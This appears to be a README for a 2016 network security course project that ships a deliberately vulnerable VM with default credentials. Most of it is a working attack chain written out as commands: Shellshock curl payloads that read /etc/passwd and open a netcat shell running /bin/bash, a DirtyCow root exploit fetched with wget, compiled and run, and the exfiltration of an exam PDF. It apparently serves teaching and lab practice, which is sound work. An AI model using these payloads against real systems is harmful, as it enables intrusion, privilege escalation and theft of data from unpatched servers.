# Network Security 2016 Project


### VM

Can be downloaded here: https://drive.google.com/open?id=0B5aLHLFCodGDTFBLRkQyWlJMNDg

**Important:** Check that bridged networking is enabled (Settings > Network > Adapter 1 > Attached to: Bridged Adapter)

Then you can access the webserver running on the VM from your host system.

**Users:** 

* root:root
* netsec:netsec


### How to Exploit

Shellshock:
```
curl -H "User-Agent: () { :; }; echo \"Content-type: text/plain\"; echo \"\"; echo \"\"; /bin/cat /etc/passwd" 192.168.1.110/cgi-bin/index.cgi
```

Reverse Shell:
```
curl -H "User-Agent: () { :; }; /bin/netcat -e /bin/bash -l -p 12345" 192.168.1.110/cgi-bin/index.cgi
```

Connect to Reverse Shell:
```
netcat 192.168.1.110 12345
```

Information Gathering:
```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

DirtyCow root privilege escalation:
```
cd /tmp
wget <url>/c0w.c --no-check-certificate
gcc -pthread c0w.c -o c0w
./c0w

(Wait...)

/usr/bin/passwd
id
uid=0(root) gid=0(root) groups=0(root)
```

Get Network Security exam:
```
find / -name "exam.pdf"

cp /home/netsec/exam.pdf /tmp/exam.pdf

exit

curl -H "User-Agent: () { :; }; echo \"Content-Type: application/pdf\"; echo \"\"; echo \"\"; /bin/cat /tmp/exam.pdf" 192.168.1.110/cgi-bin/index.cgi > exam.pdf
```
